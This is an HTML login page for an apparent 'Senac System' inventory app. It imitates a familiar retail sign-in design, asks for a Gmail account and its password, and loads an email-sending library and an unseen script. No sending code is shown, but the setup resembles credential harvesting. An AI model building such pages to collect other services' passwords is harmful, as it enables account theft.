<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Estoque Sign-In</title>
    
    <!-- Font Awesome para ícones -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
    <link rel="shortcut icon" href="favicon-32x32.png">
    
    <!-- Carregar reCAPTCHA v2 -->
    <script src="https://www.google.com/recaptcha/api.js"></script>
    
    <!-- EmailJS -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    
    <style>
        /* Reset e configurações básicas */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: #fff;
            color: #333;
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        /* Cores padrão */
        :root {
            --primary-blue: #062b7c;
            --primary-orange: #faa628;
            --accent-blue: #0066c0;
            --accent-orange: #c45500;
            --light-gray: #f0f2f2;
            --border-gray: #ddd;
            --text-dark: #111;
        }
        
        /* Cabeçalho com faixas coloridas */
        .header-stripes {
            height: 75px;
            background-color: var(--primary-blue);
        }
        
        .header-stripes + .header-stripes {
            height: 25px;
            background-color: var(--primary-orange);
        }
        
        /* Container principal */
        .container {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }
        
        /* Logotipos */
        .logo-container {
            text-align: center;
            margin: 30px 0;
        }
        
        .logo {
            display: block;
            margin: 0 auto;
        }
        
        .logo-senac {
            width: 200px;
            margin-bottom: 15px;
        }
        
        .logo-system {
            width: 112px;
        }
        
        /* Formulário de login */
        .login-container {
            max-width: 400px;
            margin: 0 auto 40px;
        }
        
        .login-box {
            border: 1px solid var(--border-gray);
            border-radius: 8px;
            padding: 24px;
            margin-top: 20px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .login-title {
            font-size: 28px;
            font-weight: normal;
            margin-bottom: 20px;
        }
        
        .login-title span {
            color: var(--accent-blue);
        }
        
        /* Formulário */
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
            font-size: 13px;
        }
        
        .form-input {
            width: 100%;
            padding: 8px 10px;
            border: 1px solid #a6a6a6;
            border-radius: 3px;
            font-size: 13px;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #e77600;
            box-shadow: 0 0 3px 2px rgba(228,121,17,.5);
        }
        
        /* Links */
        .link {
            color: var(--accent-blue);
            text-decoration: none;
            font-size: 13px;
        }
        
        .link:hover {
            color: var(--accent-orange);
            text-decoration: underline;
        }
        
        /* Container do reCAPTCHA */
        .recaptcha-container {
            margin: 20px 0;
            display: flex;
            justify-content: center;
        }
        
        /* Botão de login com reCAPTCHA */
        .btn-login {
            width: 100%;
            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
            border: 1px solid #a2a6ac;
            border-radius: 3px;
            padding: 8px;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .btn-login:hover {
            background: linear-gradient(to bottom, #f5d78e, #eeb933);
        }
        
        /* Botão reCAPTCHA */
        .g-recaptcha-button {
            width: 100%;
            margin: 15px 0;
        }
        
        /* Checkbox */
        .checkbox-container {
            display: flex;
            align-items: center;
            margin-top: 15px;
            font-size: 13px;
        }
        
        .checkbox {
            margin-right: 5px;
        }
        
        /* Estilo para mensagem de resultado */
        #resultado {
            margin-top: 20px;
            padding: 10px;
            border-radius: 4px;
            text-align: center;
            font-size: 14px;
        }
        
        /* Divisor */
        .divider {
            position: relative;
            text-align: center;
            margin: 25px 0;
            color: #767676;
            font-size: 12px;
        }
        
        .divider::before {
            content: "";
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background-color: var(--border-gray);
            z-index: 1;
        }
        
        .divider span {
            background-color: white;
            padding: 0 10px;
            position: relative;
            z-index: 2;
        }
        
        /* Botão criar conta */
        .btn-create-account {
            display: block;
            width: 100%;
            border: 1px solid var(--border-gray);
            border-radius: 3px;
            padding: 8px;
            font-size: 13px;
            text-align: center;
            text-decoration: none;
            color: #111;
            background-color: #f8f9fa;
            transition: background-color 0.2s;
        }
        
        .btn-create-account:hover {
            background-color: #e7e9ec;
        }
        
        /* Links de footer */
        .footer-links {
            text-align: center;
            margin-top: 30px;
            font-size: 11px;
        }
        
        .footer-links a {
            color: var(--accent-blue);
            text-decoration: none;
            margin: 0 10px;
        }
        
        .footer-links a:hover {
            color: var(--accent-orange);
            text-decoration: underline;
        }
        
        /* Footer principal */
        .main-footer {
            background-color: var(--light-gray);
            padding: 30px 0;
            border-top: 1px solid var(--border-gray);
            margin-top: auto;
        }
        
        .copyright {
            text-align: center;
            font-size: 11px;
            color: #555;
            margin-top: 20px;
        }
        
        /* Responsividade */
        @media (max-width: 768px) {
            .container {
                padding: 0 15px;
            }
            
            .login-container {
                max-width: 100%;
            }
            
            .login-box {
                padding: 20px;
            }
            
            .logo-senac {
                width: 150px;
            }
            
            .logo-system {
                width: 84px;
            }
        }
        
        @media (max-width: 480px) {
            .header-stripes {
                height: 60px;
            }
            
            .header-stripes + .header-stripes {
                height: 20px;
            }
            
            .login-title {
                font-size: 24px;
            }
            
            .footer-links a {
                display: block;
                margin: 5px 0;
            }
        }
    </style>
</head>
<body>
    <!-- Cabeçalho com faixas coloridas -->
    <header>
        <div class="header-stripes"></div>
        <div class="header-stripes"></div>
    </header>
    
    <!-- Logotipos -->
    <header class="logo-container">
        <img src="senac-logo-png_seeklogo-205285.png" alt="Senac Logo" class="logo logo-senac">
        <img src="2066642.png" alt="System Logo" class="logo logo-system">
    </header>
    
    <!-- Conteúdo principal -->
    <main class="container">
        <div class="login-container">
            <div class="login-box">
                <h1 class="login-title">
                    <span>Sign in</span>
                </h1>
                
                <!-- Formulário com ID para referência -->
                <form id="loginForm">
                    <div class="form-group">
                        <label for="email" class="form-label">Gmail account or phone number(opsicional now)</label>
                        <input type="email" id="email" name="email" class="form-input" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="password" class="form-label">Password Account</label>
                        <input type="password" id="password" name="password" class="form-input" required>
                        
                        <a href="forgot_password.html" class="link" style="display: inline-block; margin-top: 5px;">Forgot your password?</a>
                    </div>
                    
                    <!-- Botão com reCAPTCHA integrado (modelo do Google) -->
                    <button class="g-recaptcha btn-login" 
                            data-sitekey="6LctSXksAAAAAM19sUp0Z0wRZ7nAMIxlLGe7EDgf" 
                            data-callback='onSubmit' 
                            data-action='submit'>
                        Login-in
                    </button>
                    
                    <div class="checkbox-container">
                        <input type="checkbox" id="keepSignedIn" class="checkbox">
                        <label for="keepSignedIn">Keep me signed in.</label>
                    </div>
                </form>
                
                <!-- Div para mostrar resultados -->
                <div id="resultado"></div>
                
                <div class="divider">
                    <span>New to Senac System?</span>
                </div>
                
                <a href="create.html" class="btn-create-account">
                    Create your Account!
                </a>
            </div>
            
            <div class="footer-links">
                <a href="#">Conditions of Use</a>
                <a href="#">Privacy Notice</a>
                <a href="#">Help</a>
            </div>
        </div>
    </main>
    
    <!-- Rodapé -->
    <footer class="main-footer">
        <div class="container">
            <div class="footer-links">
                <a href="#">Terms and Privacy Notice</a>
                <a href="#">Send us feedback</a>
                <a href="#">Help</a>
            </div>
            <div class="copyright">
                © 2023, Senac System, Inc. or its affiliates
            </div>
        </div>
    </footer>
    <!-- Carregar index.js -->
    <script src="index.js"></script>
</body>
</html>

